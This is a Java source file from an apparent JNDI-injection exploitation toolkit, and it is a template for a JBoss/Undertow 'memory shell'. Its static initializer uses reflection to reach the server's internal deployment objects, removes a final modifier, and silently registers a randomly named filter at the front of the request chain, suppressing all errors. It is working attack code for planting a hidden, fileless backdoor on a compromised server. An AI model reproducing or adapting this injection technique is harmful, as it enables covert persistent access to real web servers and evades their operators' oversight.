package com.qi4l.jndi.template.jboss;


import io.undertow.servlet.api.DeploymentInfo;
import io.undertow.servlet.api.FilterInfo;
import io.undertow.servlet.core.DeploymentImpl;
import io.undertow.servlet.spec.HttpServletRequestImpl;
import io.undertow.servlet.util.ConstructorInstanceFactory;

import javax.security.jacc.PolicyContext;
import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Map;

import static org.fusesource.jansi.Ansi.ansi;

/**
 * jboss Filter 内存马
 * @author nu1r
 */
public class JBFMSFromContextF implements Filter {

    public static String pattern;

    static {
        try {
            String filterName = String.valueOf(System.nanoTime());

            HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
            ServletContext         context = request.getServletContext();
            Field                  f       = context.getClass().getDeclaredField("deploymentInfo");
            f.setAccessible(true);
            DeploymentInfo deploymentInfo = (DeploymentInfo) f.get(context);

            //只添加一次
            Map<String, FilterInfo> filters = deploymentInfo.getFilters();
            if (!filters.containsKey(filterName)) {

                Class      clazz  = JBFMSFromContextF.class;
                FilterInfo filter = new FilterInfo(filterName, clazz, new ConstructorInstanceFactory<Filter>(clazz.getDeclaredConstructor()));
                deploymentInfo.addFilter(filter);

                f = context.getClass().getDeclaredField("deployment");
                f.setAccessible(true);
                Field modifiersField = Field.class.getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                DeploymentImpl deployment = (DeploymentImpl) f.get(context);
                deployment.getFilters().addFilter(filter);

                // 0 表示把我们动态注册的 filter 放在第一位
                deploymentInfo.insertFilterUrlMapping(0, filterName, pattern, DispatcherType.REQUEST);
            }
        } catch (Exception ignored) {
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
    }

    @Override
    public void destroy() {
    }
}
